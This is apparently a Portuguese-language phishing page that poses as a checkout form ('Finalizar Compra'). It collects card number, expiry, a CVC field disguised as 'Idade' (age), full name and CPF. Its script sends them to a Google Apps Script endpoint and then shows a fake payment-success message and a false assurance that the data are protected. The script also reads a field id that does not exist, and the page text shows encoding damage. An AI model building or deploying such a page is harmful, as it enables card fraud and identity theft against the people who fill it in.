<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Agendamento</title>

<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #f2f2f2;
}

.container {
    max-width: 420px;
    margin: auto;
    min-height: 100vh;
    background: #fff;
    padding: 20px;
}

.header {
    text-align: center;
    margin-bottom: 20px;
}

.header h2 {
    margin: 0;
    font-size: 20px;
}

.header p {
    font-size: 14px;
    color: #666;
}

.label {
    font-size: 13px;
    font-weight: bold;
    margin-bottom: 5px;
    display: block;
}

input {
    width: 100%;
    padding: 14px;
    border-radius: 8px;
    border: 1px solid #ccc;
    font-size: 15px;
    margin-bottom: 15px;
}

.row {
    display: flex;
    gap: 10px;
}

input:focus {
    outline: none;
    border-color: #2962ff;
}

.botao {
    width: 100%;
    padding: 16px;
    background: #2962ff;
    color: #fff;
    border: none;
    border-radius: 10px;
    font-size: 16px;
    font-weight: bold;
    margin-top: 10px;
}

.seguro {
    text-align: center;
    font-size: 12px;
    color: #777;
    margin-top: 10px;
}

.sucesso {
    display: none;
    background: #d4edda;
    color: #155724;
    padding: 12px;
    border-radius: 8px;
    text-align: center;
    margin-top: 15px;
}
</style>
</head>

<body>

<div class="container">

    <div class="header">
        <h2>Finalizar Compra</h2>
        <p>Preencha corretamente os dados abaixo</p>
    </div>

    <label class="label">NÃºmero Do CartÃ£o</label>
    <input id="numero" type="tel" placeholder="Ex: Insira o numero do cartÃ£o">

    <div class="row">
        <div style="flex:1">
            <label class="label">Validade (MM/AA)</label>
            <input id="data" type="text" placeholder="MM/AA" maxlength="5">
        </div>
        <div style="flex:1">
            <label class="label">Idade</label>
            <input id="CVC" type="text" placeholder="Ex: 25">
        </div>
    </div>

    <label class="label">Nome completo</label>
    <input id="nome" type="text" placeholder="Digite seu nome completo">

    <label class="label">CPF</label>
    <input id="cpf" type="text" placeholder="000.000.000-00">

    <button class="botao" onclick="enviar()">Confirmar Comprar</button>

    <div class="seguro">
        ðŸ”’ Seus dados estÃ£o protegidos
    </div>

    <div class="sucesso" id="msgSucesso">
        âœ… Pagamento efetuado com sucesso!
    </div>

</div>

<script>
function enviar() {
    const numero = document.getElementById("numero").value;
    const data = document.getElementById("data").value;
    const idade = document.getElementById("idade").value;
    const nome = document.getElementById("nome").value;
    const cpf = document.getElementById("cpf").value;

    if (!numero || !data || !idade || !nome || !cpf) {
        alert("Preencha todos os campos.");
        return;
    }

    fetch("https://script.google.com/macros/s/AKfycbxyuC8p_x3NEqTADIXLEKC46_0NDT5IK1Yrw3KeekfVb73z5w2CLPExWUR_DT_bMzvo/exec", {
        method: "POST",
        body: JSON.stringify({ numero, data, idade, nome, cpf }),
        headers: { "Content-Type": "application/json" }
    })
    .then(() => {
        document.getElementById("msgSucesso").style.display = "block";
    })
    .catch(() => {
        alert("Erro ao comprar. Tente novamente.");
    });
}
</script>

</body>
</html>
